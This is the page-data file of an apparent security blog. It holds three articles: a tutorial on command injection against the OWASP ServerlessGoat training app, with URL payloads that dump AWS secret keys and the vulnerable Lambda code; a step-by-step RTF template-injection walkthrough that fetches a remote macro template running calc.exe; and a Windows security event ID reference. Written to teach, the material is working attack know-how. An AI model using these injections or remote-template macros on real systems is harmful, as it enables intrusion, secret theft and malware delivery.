{"componentChunkName":"component---src-templates-blog-post-js","path":"/articles/cloud-hacking-serverless-function-injection/","result":{"pageContext":{"post":{"fields":{"slug":"/cloud-hacking-serverless-function-injection"},"excerpt":null,"frontmatter":{"date":"16th February 2022 ","title":"Cloud Hacking :- Serverless Function Injection","description":"In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions listen for events or triggers to be run. It is possible to inject data to these events, leading to injection vulnerabilities in serverless functions.","tags":"cloud, how-to, serverless-functions","posttype":"article"},"body":"In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions listen for events or triggers to be run. It is possible to inject data to these events, leading to injection vulnerabilities in serverless functions.\n\n##What is a function?\n\nIt is a piece of code that you can use over and over again to perform a task.\n\n##What is serverless?\n\nIn serverless architecture, you are building and running code on someone else's computer. In cloud context, the computer belongs to the cloud provider and resides on their premises. Because the computer serves your code, it is referred to as a server. The cloud provider is responsible for maintaining the server and, thus, you are left with a \"serverless\" setting.\n\n##Piecing it together - A serverless function\n\nA serverless function is a piece of code that runs on the cloud provider's computer and it can perform a task over and over again.\n\n##What are some examples of serverless functions?\n\n* AWS Lambda\n* Microsoft Azure Functions\n* Google Cloud Functions\n\nTo perform a task, the function requires an event or a trigger. These events or triggers can originate from different sources. Examples include:\n\n* HTTP APIs\n* Changes in systems like databases\n* Other alerting systems\n\n##Where does the injection come in?\n\nIn context of serverless functions, injection vulnerabilities occur when unexpected input is sent to the function. The process of sending unexpected input can be referred to as an injection attack. \n\n##Why does it work?\n\nTwo aspects come into play:\n\n1. Your ability to control variables passed to the function;\n3. Whether the server trusts your input and executes it.\n\nIn case of command injection vulnerabilities, the function should run shell or operating system commands in the background.\n\nNow that we have our foundations set up, let us demonstrate this with an easy-to-follow example.\n\n#Serverless event-data injection\n\nThis example demonstrates how to execute unwanted code via a serverless function. To do this example, you will only require a browser. We have done this example using the OWASP ServerlessGoat web application, which you can find in the below URL.\n\n* https://www.serverless-hack.me/\n\nThe application converts Doc files to text from a URL. The output is then displayed on the screen.\n\n<img src=\"/static/b576cf8f-2a9d-43b3-a1d1-3ed12f9b0f12.png\">\n\nIn case of OWASP ServerlessGoat, the injection vulnerability occurs when the Doc filename is appended with code that gets executed. \n\n##Instructions\n\n<h5 class=\"step\">Step 1 - Navigate to https://www.serverless-hack.me/</h5>\n\nThe vulnerable app resides here. You can alternatively create your own serverless functions in the cloud!\n\n<h5 class=\"step\">Step 2 - Append the filename with the command you want to execute.</h5>\n\nFor example, using a semi-comma to separate the filename from the command you want to execute will print out the environment variables:\n```\nhttps://www.puresec.io/hubfs/document.doc;env\n```\n\nThe output will display a secret (the AWS secret access key)!\n\n<img src=\"/static/96002e52-8f1b-496a-ba9c-0c4631826a30.png\">\n\nOr to output text of your choice, you can use the \"echo\" command:\n```\nhttps://www.puresec.io/hubfs/document.doc;echo \"hello\"\n```\n\nDisplayed below is \"hello\" echoed back to us.\n\n<img src=\"/static/6359b91a-fa74-45f0-b9c2-52f5b3a49fae.png\">\n\n\nTo understand why this works, you may wish to review the code used for the function:\n```\nconst child_process = require('child_process');\nconst AWS = require('aws-sdk');\nconst uuid = require('node-uuid');\n\nasync function log(event) {\n  const docClient = new AWS.DynamoDB.DocumentClient();\n  let requestid = event.requestContext.requestId;\n  let ip = event.requestContext.identity.sourceIp;\n  let documentUrl = event.queryStringParameters.document_url;\n\n  await docClient.put({\n      TableName: process.env.TABLE_NAME,\n      Item: {\n        'id': requestid,\n        'ip': ip,\n        'document_url': documentUrl\n      }\n    }\n  ).promise();\n\n}\n\nexports.handler = async (event) => {\n  try {\n    await log(event);\n\n    let documentUrl = event.queryStringParameters.document_url;\n\n    let txt = child_process.execSync(`curl --silent -L ${documentUrl} | /lib64/ld-linux-x86-64.so.2 ./bin/catdoc -`).toString();\n\n    // Lambda response max size is 6MB. The workaround is to upload result to S3 and redirect user to the file.\n    let key = uuid.v4();\n    let s3 = new AWS.S3();\n    await s3.putObject({\n      Bucket: process.env.BUCKET_NAME,\n      Key: key,\n      Body: txt,\n      ContentType: 'text/html',\n      ACL: 'public-read'\n    }).promise();\n\n    return {\n      statusCode: 302,\n      headers: {\n        \"Location\": `${process.env.BUCKET_URL}/${key}`\n      }\n    };\n  }\n  catch (err) {\n    return {\n      statusCode: 500,\n      body: err.stack\n    };\n  }\n};\n```\n\n##Well that was easy... What next?\n\nWhy not look into executing other commands or practice with creating your own serverless functions next?"},"prev":{"fields":{"slug":"/security-log-reference"},"excerpt":null,"frontmatter":{"date":"17th February 2022 ","title":"Security Log Reference","description":"This article serves as a quick reference for Windows Security Log event IDs.","tags":"security-logs, windows","posttype":"article"},"body":"This article serves as a quick reference for Windows Security Log event IDs.\n\n# Windows Security Log Reference\n\nTo Open the security log run\n```\neventvwr.msc\n```\n\nThen in the console tree, expand Windows Logs, and then click Security. The results pane lists individual security events.\n\n## User Account Changes\n\n| Event ID | Description                                  |\n|----------|----------------------------------------------|\n| 4720     | Created                                      |\n| 4722     | Enabled                                      |\n| 4723     | User changed own password                    |\n| 4724     | Privileged User changed this user's password |\n| 4725     | Disabled                                     |\n| 4726     | Deleted                                      |\n| 4738     | Changed                                      |\n| 4740     | Locked out                                   |\n| 4767     | Unlocked                                     |\n| 4781     | Name change                                  |\n\n## Domain Controller Authentication Events\n\n\n| Event ID | Description                                                                                |\n|----------|--------------------------------------------------------------------------------------------|\n| 4768     | A Kerberos authentication ticket (TGT) was requested                                       |\n| 4771     | Kerberos pre-authentication failed                                                         |\n| 4820     | A Kerberos TGT was denied because the device does not meet the access control restrictions |\n\n\n## Logon Session Events (Correlate by Logon ID)\n\n| Event ID | Description                             |\n|----------|-----------------------------------------|\n| 4624     | Successful logon                        |\n| 4647     | User initiated logoff                   |\n| 4625     | Logon failure {See Logon Failure Codes) |\n| 4778     | Remote desktop session reconnected      |\n| 4779     | Remote desktop session disconnected     |\n| 4800     | Workstation locked                      |\n| 4801     | Workstation unlocked                    |\n| 4802     | Screen saver invoked                    |\n| 4803     | Screen saver dismissed                  |\n\n## Logon Types\n\n| Type ID | Description                   |\n|---------|-------------------------------|\n| 2       | Interactive                   |\n| 3       | Network (i.e. mapped drive)   |\n| 4       | Batch                         |\n| 5       | Service (service startup)     |\n| 7       | Unlock                        |\n| 8       | Network Cleartext             |\n| 10      | Remote Desktop                |\n| 11      | Logon with cached credentials |\n\n\n## Security Group Changes\n\n\n| Action         | Local | Global | Universal |\n|----------------|-------|--------|-----------|\n| Created        | 4731  | 4727   | 4754      |\n| Changed        | 4735  | 4737   | 4755      |\n| Deleted        | 4734  | 4730   | 4758      |\n| Member Added   | 4732  | 4728   | 4756      |\n| Member Removed | 4733  | 4729   | 4757      |\n\n\n## Distribution Group Changes\n\n| Action         | Local | Global | Universal |\n|----------------|-------|--------|-----------|\n| Created        | 4744  | 4749   | 4759      |\n| Changed        | 4745  | 4750   | 4760      |\n| Deleted        | 4748  | 4753   | 4763      |\n| Member Added   | 4746  | 4751   | 4761      |\n| Member Removed | 4747  | 4752   | 4762      |"},"next":{"fields":{"slug":"/rtf-template-injection"},"excerpt":"In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.…","frontmatter":{"date":"9th February 2022 ","title":"RTF Template Injection","description":"In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.","tags":"exploit-development, rtf","posttype":"article"},"body":"\nIn this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.\n\n## What is an RTF file?\n\nTapping away in front of your Macintosh or the early versions of Windows, did you ever wonder what those .rtf files (Rich Text Format) were that you ever so occasionally encountered? The ones that were opened up with text editors (featuring a horizontal ruler) other than your trusted notepad?\n\nRTF traces back to the late 1980s when it was developed and released. Rich text format files, as opposed to plain text files, can contain images, different font styles, formatting, and more. They are interoperable, which means they can be processed by a wide range of technologies, making them a portable file type. \n\n## Why should I care?\n\n\"Why should I care?\" you might wonder. The short answer is that with little modification, this technique can be leveraged to spread malicious macros in otherwise benign RTF files - as actively being done by threat actor groups online. Within RTF files, specific control words (see http://latex2rtf.sourceforge.net/rtfspec_62.html for more) are used. These control words are specially formatted commands that instruct applications how to handle the file. Let us get started!  \n\n# Instructions - RTF template injection with a calculator pop-up\n\nIn this example, we will demonstrate how to use the \"template\" control word to cause an RTF file to fetch another file from a web server controlled by us.  This example makes use of the template editing capabilities of RTF files, as well as the ability to fetch resources from a specified URL. The code we will use opens up a calculator on a Windows-based operating system when the RTF file is run. Note that macros will require enabling on your system.\n\n<h5 class=\"step\">Step 1 - Create a macro-enabled Word template file</h5>\n\nThis file will contain our macro that executes the calculator app when the RTF file is opened. \n\nOpen Word and add the following Visual Basic code (macro) to it. Save the file as `calc.dotm`. \n\n```\nSub AutoOpen()\nDim Program As String\nDim TaskID As Double\nProgram = \"calc.exe\"\nTaskID = Shell(Program, 1)\nEnd Sub\n```\n\n*If you are unfamiliar with creating Word template files, we recommend checking out Microsoft's documentation on them: https://support.microsoft.com/en-us/office/save-a-word-document-as-a-template-cb17846d-ecec-49d4-82ea-a6f5e3e8b9ae.*\n\n<h5 class=\"step\">Step 2 - Start a web server</h5>\n\nLaunch an HTTP server in the folder containing the 'calc.dotm' file using your preferred method. If you are using Python 3, you can use the following command with the port number of your choice. \n\n```\npython3 -m http.server <port number>\n```\n\n<h5 class=\"step\">Step 3 - Create a benign RTF file</h5>\n\nGet or make a simple RTF file. We will modify this in the next step to fetch our macro-enabled template file from the web server launched.\n\n![](5e05c49b-2704-464a-9eb8-6afe16b298ec.png)\n\n*There are sample RTF files you can use available online. Please always have your anti-virus solution enabled when downloading files from the Internet.*\n\n<h5 class=\"step\">Step 4 - Add remote template fetching capabilities to the RTF file</h5>\n\nUse a HEX editor to open the RTF file created in the previous step. I used Hex Editor Neo. \n\nLook for a pre-existing enclosing group for a font family control word (for example, Times New Roman if your file uses it). Insert the following text after the font's ending tag with your listening IP and port + payload/file to fetch. \n\n```\n{\\*\\template http://<your-IP>:<port number>/calc.dotm}\n```\n\n![](514cab5a-57fa-4783-9db1-35ca3867a8ef.png)\n\n<h5 class=\"step\">Step 5 - Show time</h5>\n\nSave the changes and open the RTF file in its default application. If you are a Windows user, this will likely be Word. The remote file will be loaded from your web server and used to launch the calculator program when the RTF file is opened.\n\nThe below screen capture displays the macro-enabled template file being fetched.\n\n![](20e0eb7d-9a66-4ff2-991c-366e9a7a3d84.png)\n\nThe below screen capture displays the RTF file opened and the calculator app launched.\n\n![](c6ec75ba-dad0-4755-903a-7de8f5065320.png)\n\n### Well that was easy... Where to from here?\n\nI hope this article has served as a foundation for your further explorations. Why not look into creating your custom macro-enabled template files next?"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}